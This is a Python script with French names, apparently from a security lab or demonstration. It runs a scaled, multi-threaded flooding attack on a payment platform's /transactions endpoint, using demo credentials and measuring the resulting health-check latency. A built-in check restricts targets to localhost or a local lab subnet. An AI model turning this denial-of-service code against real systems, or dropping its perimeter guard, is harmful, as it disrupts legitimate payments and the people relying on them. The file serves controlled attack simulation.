






import ipaddress
import os
import signal
import sys
import threading
import time
import urllib.error
import urllib.request

RACINE = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
DUREE_S = float(os.environ.get("ATTAQUE_DUREE_S", "20"))
FILS = int(os.environ.get("ATTAQUE_FILS", "40"))


PLANCHER_FILS = int(os.environ.get("ATTAQUE_FILS_MIN", "20"))
PLAFOND_FILS = int(os.environ.get("ATTAQUE_FILS_MAX", "200"))
FILS_PAR_PARTICIPANT = int(os.environ.get("ATTAQUE_FILS_PAR_PARTICIPANT", "4"))


def fils_depuis_compteur(total) -> int:



    try:
        total = max(0, int(total))
    except (TypeError, ValueError):
        total = 0
    return max(PLANCHER_FILS, min(PLAFOND_FILS, PLANCHER_FILS + FILS_PAR_PARTICIPANT * total))

_arret = threading.Event()
_compteur = dict(envoyees=0, erreurs=0)
_verrou = threading.Lock()


def cible_autorisee(hote: str) -> bool:

    try:
        adresse = ipaddress.ip_address(hote)
    except ValueError:
        return hote == "localhost"
    reseau = ipaddress.ip_network(os.environ.get("ALPHA_PERIMETRE", "192.168.137.0/24"))
    return adresse.is_loopback or adresse in reseau


def _cible():
    chemin = os.environ.get("ALPHA_CONFIG") or os.path.join(RACINE, "config", "interfaces.json")
    import json
    with open(chemin, encoding="utf-8") as f:
        return json.load(f)["plateforme"]["url"].rstrip("/")


def _jeton(url: str):
    """Jeton attaquant (creds de demo) pour pouvoir ecrire des paiements."""
    import json
    try:
        data = json.dumps({"username": "demo", "password": "demo"}).encode()
        req = urllib.request.Request(url + "/auth/token", data=data, method="POST",
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=5) as r:
            return json.load(r).get("access_token")
    except (urllib.error.URLError, OSError, ValueError):
        return None


def _marteau(url: str, jeton=None) -> None:
    # Saturer les PAIEMENTS : ecritures concurrentes sur /transactions -> contention reelle
    # (SQLite se verrouille) -> de vrais 503 pour les paiements legitimes aussi.
    import json
    corps = json.dumps({"amount_cents": 1250, "currency": "EUR",
                        "payer": "attaque", "payee": "caisse"}).encode()
    headers = {"Content-Type": "application/json"}
    if jeton:
        headers["Authorization"] = "Bearer " + jeton
    while not _arret.is_set():
        try:
            req = urllib.request.Request(url + "/transactions", data=corps, method="POST", headers=headers)
            with urllib.request.urlopen(req, timeout=5) as r:
                r.read()
            with _verrou:
                _compteur["envoyees"] += 1
        except (urllib.error.URLError, OSError):
            with _verrou:
                _compteur["erreurs"] += 1


def lancer(niveau: int, nom: str, n_fils: int | None = None) -> int:
    actifs = n_fils if n_fils else FILS
    url = _cible()
    hote = url.split("//")[-1].split("/")[0].split(":")[0]
    print("[REEL] niveau %d : %s" % (niveau, nom), flush=True)
    print("[REEL] cible : %s" % url, flush=True)
    if not cible_autorisee(hote):
        print("ERREUR : cible hors perimetre autorise (%s) : attaque refusee" % hote, flush=True)
        return 3

    def arreter(*_):
        _arret.set()
    signal.signal(signal.SIGTERM, arreter)


    t0 = time.time()
    try:
        with urllib.request.urlopen(url + "/health", timeout=5) as r:
            r.read()
    except (urllib.error.URLError, OSError) as e:
        print("ERREUR : plateforme injoignable avant l'attaque : %s" % e, flush=True)
        return 1
    ref_ms = int((time.time() - t0) * 1000)
    print("[REEL] latence de reference /health : %d ms" % ref_ms, flush=True)
    jeton = _jeton(url)
    print("[REEL] %d fils d'ecriture sur /transactions, %d s%s" % (
        actifs, DUREE_S, "" if jeton else " (sans jeton : 401 attendus)"), flush=True)

    fils = [threading.Thread(target=_marteau, args=(url, jeton), daemon=True) for _ in range(actifs)]
    for f in fils:
        f.start()
    debut = time.time()
    while not _arret.is_set() and time.time() - debut < DUREE_S:
        time.sleep(2.0)
        tm = time.time()
        try:
            with urllib.request.urlopen(url + "/health", timeout=5) as r:
                r.read()
            lat = int((time.time() - tm) * 1000)
        except (urllib.error.URLError, OSError):
            lat = -1
        with _verrou:
            n = _compteur["envoyees"]
        etat = "%d ms" % lat if lat >= 0 else "timeout"
        print("[REEL] +%ds : %d requetes envoyees, latence /health %s" % (int(time.time() - debut), n, etat), flush=True)
    _arret.set()
    time.sleep(0.5)
    with _verrou:
        print("[REEL] fin : %d requetes envoyees, %d erreurs" % (_compteur["envoyees"], _compteur["erreurs"]), flush=True)
    return 0


def principal(niveau: int, nom: str) -> None:
    sys.exit(lancer(niveau, nom))
